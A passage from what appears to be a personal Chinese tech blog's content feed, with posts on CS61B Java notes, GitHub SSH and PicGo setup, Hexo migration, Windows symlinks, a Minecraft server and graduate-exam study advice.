Checking（类型检查）</h3><p>如果基类中的某个方法被子类重写，那么在运行时调用的方法是由该变量的运行时类型（或动态类型）决定的。</p><ul><li><p><strong>静态类型</strong>（StaticType）：<strong>编译时</strong>类型，指编译器在编译代码时知道的类型。它是由变量声明中的类型决定的。</p></li><li><p><strong>动态类型</strong>（DynamicType）：<strong>运行时</strong>类型，指变量在运行时实际引用的对象的类型。</p></li></ul><p><img src="https://joshhug.gitbooks.io/hug61b/content/assets/dynamic_selection.png"></p><ol type="1"><li>上述代码中<code>sl.printLostItems();</code>在<strong>编译阶段</strong>出错，尽管<code>sl</code> 实际上是 <code>VengefulSLList</code>类型的对象，但编译器只能看到它的静态类型<code>SLList</code>，因此无法调用 <code>VengefulSLList</code>中特有的方法。</li><li>上述代码中<code>VengefulSLList&lt;Integer&gt; vsl2 = sl;</code>在<strong>编译阶段</strong>出错，编译器只看到sl的静态类型是SLList，并不能确定它是否可以安全地转换为<code>VengefulSLList</code> 类型</li></ol><h3 id="casting类型转换">Casting（类型转换）</h3><p>相当于欺骗编译器，注意若使用不当可能会在运行时发生错误。</p><p>类型转换示例如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VengefulSLList&lt;Integer&gt; vsl2 = (VengefulSLList&lt;Integer&gt;) sl;  <span class="comment">// 类型转换</span></span><br><span class="line">vsl2.printLostItems();  <span class="comment">// 调用 VengefulSLList 中的方法</span></span><br></pre></td></tr></tbody></table></figure><h3 id="higher-order-functions高阶函数">Higher OrderFunctions（高阶函数）</h3><p>高阶函数的定义是：可以接受一个或多个函数作为参数。</p><p>示例：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IntUnaryFunction</span> {</span><br><span class="line">    <span class="type">int</span> <span class="title function_">apply</span><span class="params">(<span class="type">int</span> x)</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TenX继承接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TenX</span> <span class="keyword">implements</span> <span class="title class_">IntUnaryFunction</span>{</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">apply</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10</span> * x;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">do_twice</span><span class="params">(IntUnaryFunction f, <span class="type">int</span> x)</span> {</span><br><span class="line">        <span class="keyword">return</span> f.apply(f.apply(x));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">IntUnaryFunction</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TenX</span>();</span><br><span class="line">        System.out.println(do_twice(f, <span class="number">2</span>));</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="proj1-part2">Proj1 part2</h2><p>Karplus-Strong algorithm（用于合成音乐的算法，弦乐器模拟）</p><h2 id="section-3">4.3</h2><p>Polymorphism（多态性），4.2提到的动态类型选择，对于属于 SubtypePolymorphism （子类多态性）。</p><h3 id="comparator">Comparator</h3><p>内置接口，通过<code>import java.util.Comparator;</code>调用</p>]]></content>
    
    
    <categories>
      
      <category>CS61B</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>CS61B</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Github图床设置</title>
    <link href="/2024/06/18/%E5%9B%BE%E5%BA%8A%E8%AE%BE%E7%BD%AE/"/>
    <url>/2024/06/18/%E5%9B%BE%E5%BA%8A%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>参考官网：https://picgo.github.io/PicGo-Doc/zh/guide/config.html#github%E5%9B%BE%E5%BA%8A</p><p>博客迁移完毕，接下来考虑图床问题。</p><blockquote><p>如果单纯将图片粘贴在Typora中，那个只是保存在本地，部署后，在网页端是无法显示的，这时就需要用到图床，将图片发送到对应的服务器中，然后在文章中以URL的形式展示该图片。</p></blockquote><p>之前我使用的是<a href="https://github.com/Molunerfinn/PicGo">PicGo</a>，方便好用，准备在新电脑上继续使用，我只需要将之前的配置迁移一下即可。</p><ul><li>PicGo下载完成后，打开“图床设置”，将对应的仓库名（需要提前创建）和分支填好。</li><li>将该仓库的token填写在对应的方框中。</li><li>最后一行“设定自定义域名”可以参考<a href="https://blog.csdn.net/qq_39921135/article/details/136278309">这篇文章</a>，简单来说就是Github访问速度慢，需要CDN进行加速。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240618002755739.png"></p>]]></content>
    
    
    <categories>
      
      <category>Github</category>
      
      <category>PicGo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github</tag>
      
      <tag>PicGo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客迁移</title>
    <link href="/2024/06/17/%E8%BF%81%E7%A7%BB%E5%8D%9A%E5%AE%A2/"/>
    <url>/2024/06/17/%E8%BF%81%E7%A7%BB%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>我的博客方案是：Github Pages + Hexo</p></blockquote><p>参考：https://blog.csdn.net/qq_43698421/article/details/120407042</p><p>最近换了新电脑，需要把之前的博客转移到新电脑上。</p><ol type="1"><li><p>首先在新电脑上配置Hexo环境，参考<a href="https://hexo.io/zh-cn/docs/">官网</a>，只要按照步骤执行到<code>npm install -g hexo-cli</code>即可（包括这一步）</p></li><li><p>将下列文件（位于原电脑中的Hexo文件夹）复制到新电脑中创建好的文件夹中</p><ul><li>_config.yml</li><li>package.json</li><li>scaffolds</li><li>source</li><li>themes</li><li>.gitignore</li></ul></li><li><p>执行<code>npm install</code>命令</p></li><li><p>执行<code>hexo g</code>，生成静态文件</p><blockquote><p>这里我有报错，因为新电脑没有Pandoc（文档转换工具），这个工具我主要用于Markdown与LaTeX的转换，方便显示公式。</p><p>解决方案：安装Pandoc以及对应的hexo插件</p></blockquote></li><li><p>执行<code>hexo s</code>，在本地查看是否能正确访问</p></li><li><p>若上一步能正确访问，执行<code>hexo d</code>部署网站，然后就可以访问对应的GitHubPages了</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
      <category>Github</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用SSH连接Github</title>
    <link href="/2024/06/09/%E5%88%A9%E7%94%A8SSH%E8%BF%9E%E6%8E%A5Github/"/>
    <url>/2024/06/09/%E5%88%A9%E7%94%A8SSH%E8%BF%9E%E6%8E%A5Github/</url>
    
    <content type="html"><![CDATA[<blockquote><p>换了新电脑，环境需要重新配置</p></blockquote><p>参考：https://docs.github.com/zh/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent</p><p>使用 SSH 协议可以连接远程服务器和服务并向它们验证。 利用 SSH密钥可以连接到 GitHub，而无需在每次访问时都提供用户名和 personal accesstoken。 还可以使用 SSH 密钥对提交进行签名。</p><h3 id="第一步">第一步</h3><p>首先生成一个ssh密钥：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh-keygen -t ed25519 -C <span class="string">"your_email@example.com"</span></span></span><br></pre></td></tr></tbody></table></figure><p>接着系统会提示你输入文件保存位置。按Enter键接受默认位置（通常是<code>~/.ssh/id_ed25519</code>或<code>~/.ssh/id_rsa</code>）。</p><p>然后系统会提示你输入一个密码（passphrase）。虽然这一步是可选的，但强烈建议你输入一个密码来增加安全性。</p><h3 id="第二步">第二步</h3><p>首先复制ssh公钥：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> ~/.ssh/id_ed25519.pub</span></span><br></pre></td></tr></tbody></table></figure><p>打开GitHub，前往 <strong>Settings &gt; SSH and GPG keys</strong>，点击 <strong>New SSH key</strong>。在 <strong>Title</strong>栏输入一个描述性的名称，然后在 <strong>Key</strong>栏粘贴之前复制的公钥，最后点击 <strong>Add SSH key</strong>。</p><h3 id="第三步">第三步</h3><p>添加SSH密钥到ssh-agen，当你生成SSH密钥时，通常会设置一个密码短语（passphrase，第一步）来保护你的私钥。每次使用私钥进行身份验证时，例如执行<code>git push</code>、<code>git pull</code>或连接到远程服务器，你都需要输入这个密码短语。通过将SSH密钥添加到<code>ssh-agent</code>，<code>ssh-agent</code>会在内存中缓存解密后的私钥。这样，你只需在将密钥添加到<code>ssh-agent</code>时输入一次密码短语，之后就不需要频繁输入了。</p><p>首先以管理员身份打开Terminal，启动<code>ssh-agent</code></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">Get-Service -Name ssh-agent | Set-Service -StartupType Manual(可改为Automatic)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">Start-Service ssh-agent</span></span><br></pre></td></tr></tbody></table></figure><p>然后将ssh私钥添加到<code>ssh-agent</code>中：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh-add c:/Users/YOU/.ssh/id_ed25519</span></span><br></pre></td></tr></tbody></table></figure><h3 id="第四步">第四步</h3><p>测试是否成功连接Github：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh -T git@github.com</span></span><br></pre></td></tr></tbody></table></figure><p>若成功，则能看见：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">Hi username! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span></span><br></pre></td></tr></tbody></table></figure><h3 id="第五步">第五步</h3><p>接下来就可以通过使用<code>git@github.com:username/repository.git</code>对远程仓库进行相关操作</p>]]></content>
    
    
    <categories>
      
      <category>Github</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>修复Office</title>
    <link href="/2024/05/07/%E4%BF%AE%E5%A4%8DOffice/"/>
    <url>/2024/05/07/%E4%BF%AE%E5%A4%8DOffice/</url>
    
    <content type="html"><![CDATA[<p>上个月，由于C盘空间日渐减少，我便将C盘中的<code>Microsoft Office</code>文件夹中的文件剪切到了D盘中，然后通过<code>mklink</code>命令将C盘中的<code>Microsoft Office</code>链接到D盘中。</p><p>之后的一段时间内使用起来还是没问题，但是昨天突然无法打开Office三件套，报错显示：“操作系统当前的配置不能运行此应用程序”。</p><blockquote><p><strong>事实证明我上面提到的链接的方法是不可行的，因为在电脑重启后，<code>Office</code>就会出现上述的错误，这里不建议使用第一段提到的方法移动<code>Office</code></strong></p></blockquote><p>网上搜了一些解决方案，不少都是卸载重装，但是感觉太繁琐，于是我先取消链接：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">管理员权限打开cmd</span></span><br><span class="line">rmdir "C:\Users\{username}\.vscode\extensions"</span><br></pre></td></tr></tbody></table></figure><p>然后将D盘中的Office文件剪切回C盘原来的位置，然后尝试打开三件套，发现还是不行，再次搜索解决方案，发现Windows可以自行修复：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404101106469.png"></p><p>一开始我使用快速修复，结果没用，然后尝试联机修复，成功！</p>]]></content>
    
    
    <categories>
      
      <category>Office</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Minecraft服务器搭建</title>
    <link href="/2024/04/10/minecraft%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/04/10/minecraft%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="minecraft服务器搭建">minecraft服务器搭建</h2><p>主要的搭建过程参考下面的文章：</p><p>https://vegastack.com/tutorials/how-to-install-minecraft-server-on-ubuntu-22-04/</p><blockquote><p><strong>第四步</strong>下载的服务器版本可以在这里选择https://www.minecraft.net/en-us/download/server</p></blockquote><blockquote><p>如果没有购买正版游戏，可以将服务器修改为离线登录：https://zhidao.baidu.com/question/565316940938880764.html</p></blockquote><h2 id="screen用法"><code>screen</code>用法</h2><p><code>screen</code>命令允许用户在一个窗口内使用多个终端会话，如果没有用到该命令，这里可直接跳过。</p><p>参考：https://www.digitalocean.com/community/tutorials/how-to-create-a-minecraft-server-on-ubuntu-22-04</p><ol type="1"><li><p>返回主shell</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + A + D</span><br></pre></td></tr></tbody></table></figure></li><li><p>展示所有已经存在的会话</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -list</span><br></pre></td></tr></tbody></table></figure><p>运行后会显示会话的ID：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OutputThere is a screen on:</span><br><span class="line">        3626.pts-0.minecraft-2204(03/02/22 22:56:33)(Detached)</span><br><span class="line">1 Socket in /run/screen/S-root.</span><br></pre></td></tr></tbody></table></figure></li><li><p>返回某个会话，使用<code>-r</code>参数以及该会话的ID（例如：3626）</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -r 3626</span><br></pre></td></tr></tbody></table></figure></li></ol><h2 id="相关指令">相关指令</h2><blockquote><p>连接服务器，修改游戏设置，参考https://cloud.tencent.com/developer/article/1651381</p><p>第八条</p></blockquote><p>运行下面的命令可通过交互模式对服务器进行相关设置：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/minecraft/tools/mcrcon/mcrcon -H 127.0.0.1 -P 25575 -p [strong-password] -t</span><br></pre></td></tr></tbody></table></figure><ul><li>将所有成员加入队伍，并关闭友伤（主要有三个步骤）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404032144474.png"></p><ul><li>关闭死亡物品掉落</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404032145937.png"></p>]]></content>
    
    
    <categories>
      
      <category>Minecraft</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Minecraft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>移动vscode插件位置</title>
    <link href="/2024/04/10/%E7%A7%BB%E5%8A%A8vscode%E6%8F%92%E4%BB%B6%E4%BD%8D%E7%BD%AE/"/>
    <url>/2024/04/10/%E7%A7%BB%E5%8A%A8vscode%E6%8F%92%E4%BB%B6%E4%BD%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>先介绍文件共享的知识</p><h2 id="文件共享">文件共享</h2><h4 id="硬链接">硬链接</h4><ul><li>基于索引结点</li><li>不同用户的目录项指向同一个索引结点</li><li><strong>链接计数count</strong></li></ul><h4 id="软链接">软链接</h4><ul><li>创建Link型(快捷方式)文件——记录文件存放路径</li><li>共享文件被删除，Link型文件<strong>依然存在</strong>，但是会查找失败</li><li>软链接索引结点中的<strong>引用计数值</strong>应该<strong>恒为1</strong></li></ul><blockquote><p>建立符号链接时，引用计数<strong>不是复制原文件</strong>而是<strong>必为1</strong></p></blockquote><h2 id="解决方案">解决方案</h2><p>vscode插件文件夹位置一般为<code>C:\Users\{username}\.vscode\extensions</code></p><ul><li><p>先该文件夹<strong>剪切</strong>到其他位置，例如<code>D:\extensions</code></p><blockquote><p>或者将文件夹内的文件剪切/复制到目标文件夹下（即<code>D:\extensions</code>），然后将原文件夹(即<code>C:\Users\{username}\.vscode\extensions</code>)<strong>删除</strong></p></blockquote></li><li><p>管理员权限打开<strong>cmd</strong>，输入下面的命令：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink /D "C:\Users\{username}\.vscode\extensions" "D:\extensions"</span><br></pre></td></tr></tbody></table></figure></li><li><p>然后回车，搞定</p></li></ul><blockquote><p>mklink用法：<code>MKLINK [[/D] | [/H] | [/J]] Link Target</code></p><table><colgroup><col style="width: 8%"><col style="width: 12%"><col style="width: 78%"></colgroup><thead><tr class="header"><th style="text-align: center;">参数</th><th style="text-align: center;">可选/必须</th><th style="text-align: center;">说明</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">/D</td><td style="text-align: center;">可选</td><td style="text-align: center;">创建目录符号链接而不是文件符号链接（默认为文件符号链接）</td></tr><tr class="even"><td style="text-align: center;">/H</td><td style="text-align: center;">可选</td><td style="text-align: center;">创建硬链接而不是符号链接</td></tr><tr class="odd"><td style="text-align: center;">/J</td><td style="text-align: center;">可选</td><td style="text-align: center;">创建目录连接点</td></tr><tr class="even"><td style="text-align: center;">Link</td><td style="text-align: center;">必选</td><td style="text-align: center;">指定新的符号链接名称</td></tr><tr class="odd"><td style="text-align: center;">Target</td><td style="text-align: center;">必选</td><td style="text-align: center;">指定新符号链接引用的路径（绝对路径或相对路径均可）</td></tr></tbody></table></blockquote><p><strong>删除链接</strong>：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除虚拟的链接目录，并不会删除D盘中文件夹真实文件</span></span><br><span class="line">rmdir "C:\Users\{username}\.vscode\extensions"</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>存储空间</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>考研经验贴</title>
    <link href="/2024/04/09/%E8%80%83%E7%A0%94%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
    <url>/2024/04/09/%E8%80%83%E7%A0%94%E7%BB%8F%E9%AA%8C%E8%B4%B4/</url>
    
    <content type="html"><![CDATA[<p>今天是3月25日，科软的拟录取名单公布了，终于考上了<span class="github-emoji"><span>😃</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>！！！</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202403261011761.png"></p><h2 id="个人背景">个人背景</h2><p>本科就读于浙江的一所双非，专业是计算机科学与技术。大一到大三成绩还行，不过都是靠期末突击，学的也不怎么深。</p><p>高数和线代都是大一学的，早忘光了；数据结构期末考了五十几分，还是靠平时分给我拉上来的；计网、操作系统、计组都是大三上学的，学的很浅，期末考试也是靠考前突击过的。</p><p>参赛经历：参加过一些大大小小的CTF竞赛，基本只会签到题和一些简单题<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，大三下抱到大腿拿了个国奖。我大学期间就获得过这一个奖项。</p><h2 id="择校">择校</h2><p>一开始考虑的是合工大和杭电，后来无意中加了科软群，本来是看热闹的，后面了解到科软是无导师制的，培养方案很适合我。三月底，看着群里的拟录取截图，备受鼓舞，所以我就下定决心了​​。</p><p>初试分数下来一看383，好像还行。后来复试线一出，376分，倒吸一口凉气，我这分数基本就是擦线了，排名也挺靠后，不过好在复试一切顺利。</p><p>还是建议大家<strong>理性选择</strong>，除了考虑地理位置、学校实力、招收人数、培养方案，还要考虑<strong>初试复试占比</strong>，如果觉得复试没有什么优势，我觉得还是选择<code>6:4</code>和<code>7:3</code>的学校。</p><h2 id="复习建议">复习建议</h2><blockquote><p>经验贴并非现成的复习方案，需要根据自身灵活调整，希望大家理性看待，不要盲目模仿。</p></blockquote><p>我是从3月1日开始正式复习的，如果基础不好，还是建议早点开始。</p><p>可以将每天学习进度记录下来，这样第二天可以迅速定位到前一天的进度。不用提前把每天计划得很详细，大致列出需要完成的任务就行。像下面这样就行：</p><blockquote><p>2023-3-10</p><ul class="task-list"><li><label><input type="checkbox" checked="">英语单词（主要是复习）</label></li><li><label><input type="checkbox" checked="">高数（1.5基础过关）</label></li><li><label><input type="checkbox" checked="">英语语法（时态，情态）</label></li></ul></blockquote><p>这里在推荐几个经验贴：</p><ul><li><a href="https://ys8qz1wlia.feishu.cn/docx/BvXIdJQNRoyxpixM4FSckm7Nnlb">同校学长跨考科软上岸</a></li><li><a href="https://zhuanlan.zhihu.com/p/618598868">23科软经验贴汇总</a></li></ul><p>下面是我的备考过程</p><h3 id="数学二118分">数学二（118分）</h3><blockquote><p>推荐老师：高数-武忠祥，线代-李永乐/张宇</p><p>推荐教材/习题集：高等数学基础篇、高等数学辅导讲义、线性代数辅导讲义、660、880、高数严选题</p><p>推荐模拟卷/真题卷：李林四套卷、李林六套卷、张宇八套卷、张宇四套卷、李艳芳真题</p></blockquote><p>注：我线代基础跟的是张宇，强化跟的是李永乐。推荐大家多听几个老师的课，找到最适合自己。</p><h4 id="月1日5月20日基础阶段">3月1日~5月20日（基础阶段）</h4><p>主要任务：（每天三到四小时）</p><ul><li><p>跟着武忠祥学习高等数学基础篇</p></li><li><p>跟着张宇学习线代基础课（张宇30讲线代部分）</p></li><li><p>做完对应的书上的例题和习题：高数学习包、张宇30讲线代习题、300题线代部分</p></li><li><p>高数学完开始学习线代，同时每天抽时间写660高数部分（有难度）</p><blockquote><p>660我刷了70题就没刷了，感觉有点难，错题太多，有点浪费题目了，所以我在七月份强化阶段的时候才继续从第70题往后刷的</p></blockquote></li><li><p>线代学完，可以写写660线代部分（很简单，也可以不写）</p></li><li><p>有时间可以看看错题，线代例题可以刷两遍</p></li></ul><p>建议：</p><ul><li><p>前期数学可以适当给多一点时间</p></li><li><p>当老师讲到例题时，可以适当暂停思考一下，再继续。</p></li><li><p>听完一节课将辅导书上的例题自己单独做一遍</p></li><li><p>听完一节课就做对应的学习包里的习题</p></li><li><p>不要赶进度，打牢基础</p></li></ul><h4 id="月2110月6日强化阶段">5月21~10月6日（强化阶段）</h4><p>强化阶段耗时最长，提升最大</p><p>主要任务：（每天四到五小时）</p><ul><li>跟着武忠祥学习高数强化课，同时完成严选题</li><li>跟着李永乐学习线代强化课，完成书上的习题</li><li>在学习高数强化课的时候，最好不要落下线代（可以刷刷之前的错题，或者880中的线代基础题）</li><li>完成660高数部分（抽时间写）</li><li>完成880：高数+线代（高数部分可以在学习线代强化课的时候开始刷）</li></ul><blockquote><p>我在强化阶段结束时，880的线代部分写到了相似矩阵，所以到十月下旬才完成整本880。根据自己学习进度灵活调整</p></blockquote><p>建议：</p><ul><li>听完一节课，将书上的例题再自己写一遍</li><li>听完一章的课程，将对应习题集的题目完成：严选题</li><li>根据自身学习情况随时调整</li><li>有多余时间就二刷错题</li></ul><h4 id="月7日考前冲刺阶段">10月7日~考前（冲刺阶段）</h4><p>主要任务：（不超过4.5小时）</p><ul><li>7号开始做真题，我做的是09~20年真题，<strong>三天两套，第三天订正</strong>，这里可以按自己节奏来（我这里留了三年真题到十二月份写）</li><li>有时间二刷严选题错题</li><li>真题刷完，开始刷模拟卷，我先刷的是23李林四套卷和六套卷（按照考试时间模拟）</li><li>有时间二刷880错题</li><li>23李林模拟卷刷完，开始刷24张宇八套卷</li><li>八套卷刷完，刷24李林六套卷和四套卷</li><li>最后做张宇四套卷（比较难）</li></ul><p>建议：</p><ul><li><p>建议把试卷中的错题记录下来，错误原因、用了什么知识点、什么方法，我是这样记录的：</p><blockquote><ul><li>大题 16：题目要求 y(x) 的区间，而我写成了参数 t 的区间</li><li>大题 20：旋转体积算错（倍数不对），第二问物理应用式子没列对</li></ul></blockquote></li><li><p>模拟卷的讲解，推荐B站UP主<strong>没咋了</strong></p></li><li><p>错题很重要，建议冲刺阶段有时间就二刷错题</p></li></ul><h4 id="考试当日">考试当日</h4><p>我其实没什么感觉，就当平时模拟卷写了，不过前面没进入状态，跳了好几道选填（确实有难度）。大题计算量不小，证明题看完题目就直接跳了，好在线代不难，写完线代就回过头来思考选填，改了两个答案，还有一个填空实在不会。最后写证明题，好像有点思路，硬往泰勒上凑，第一问就胡乱证明了，第二问没思路也没时间了。</p><p>后来对答案，选填错四个（其中一个计算错误，亏死）<span class="github-emoji"><span>😢</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，大题应该就是证明题扣了12分。</p><h3 id="英语二82分">英语二（82分）</h3><p>英语二比较简单，重点在于单词，单词背的好，分数一定不会低，并且要坚持背。</p><blockquote><p>推荐老师：田静(语法、长难句)、刘琦(新题型)、潘赟(作文)、石雷鹏(作文)</p><p>推荐教材：英语黄皮书（也就是英语真题）</p></blockquote><h4 id="月1日5月1日">3月1日~5月1日</h4><p>主要任务：（1~2小时）</p><ul><li>背单词，每天抽出四五十分钟学习新单词加复习（时间因人而异，自行调整）</li><li>语法课（二倍速刷一遍就行），基础可以不看</li></ul><p>建议：</p><ul><li>前期单词花的时间多一点，用实体书或者APP都行，适合自己的最好</li><li>阅读技巧课可看可不看</li></ul><h4 id="月2日8月7日">5月2日~8月7日</h4><p>主要任务：（1.5~2小时）</p><ul><li>背单词，背完就再背一遍</li><li>04年~10年黄皮书真题<strong>阅读</strong></li></ul><p>建议：</p><ul><li>前期阅读做的不好没关系，10年之后的英二跟10年之前的英语差别很大</li><li>建议每一篇阅读做完后都精读一遍，生词弄熟</li></ul><h4 id="月8日9月20日">8月8日~9月20日</h4><p>主要任务：（1.5~2小时）</p><ul><li>背单词</li><li>10年~19年黄皮书<strong>英二阅读</strong></li></ul><p>建议：</p><ul><li>10年开始区分英一英二，考英二的建议只刷英二阅读</li></ul><h4 id="月21日10月12日">9月21日~10月12日</h4><p>主要任务：（1.5~2小时）</p><ul><li>背单词</li><li>10年~19年英二小三门（翻译、完型、新题型）</li></ul><p>建议：</p><ul><li>新题型可以看看刘琦的两节课，其他的没必要看课</li><li>背单词不能断</li></ul><h4 id="月13日考前">10月13日~考前</h4><p>主要任务：（1.5~2.5小时）</p><ul><li>背单词</li><li>英语作文（每隔几天练一练，考前可以看看作文模板）</li><li>二刷10~19年英二阅读真题</li><li>20~23年英二真题模拟</li></ul><p>建议：</p><ul><li>英语作文一定要动手练习，作文这方面我练得不够多，学的不够好</li></ul><h4 id="考试当日-1">考试当日</h4><p>上午考完政治，去考场安排的休息室休息，太冷了，困但是睡不着。</p><p>下午考试直接先写阅读，第一篇写完，感觉不少生词，头昏昏沉沉的，第二篇就开始犯困了，文章就看懂个大概意思，草草选了几个答案，开始第三篇，困得实在看不下去了，果断放弃。直接开始写新题型，10分钟不到写完，但自己知道正确率不高，接着就转头写作文。结果小作文写了半小时<span class="github-emoji"><span>😅</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f605.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，一看时间，寄。大作文直接不打草稿，十几分钟编完，回过头来重新检查了一遍新题型，找出两个错误，然后重新开始第三篇阅读。最后好在完型比较顺利，没有纠结。最后的分数也是有点惊喜<span class="github-emoji"><span>😄</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><h3 id="政治72分">政治（72分）</h3><p>不要开始得太早！建议八月底或九月初开始</p><blockquote><p>推荐老师：徐涛、腿姐</p><p>推荐教材：肖秀荣1000题、腿姐背诵手册、肖秀荣八套卷、肖秀荣四套卷</p></blockquote><p>注：肖秀荣1000题可以不用买，直接在微信小程序上刷；腿姐背诵手册和肖秀荣背诵手册二选一</p><h4 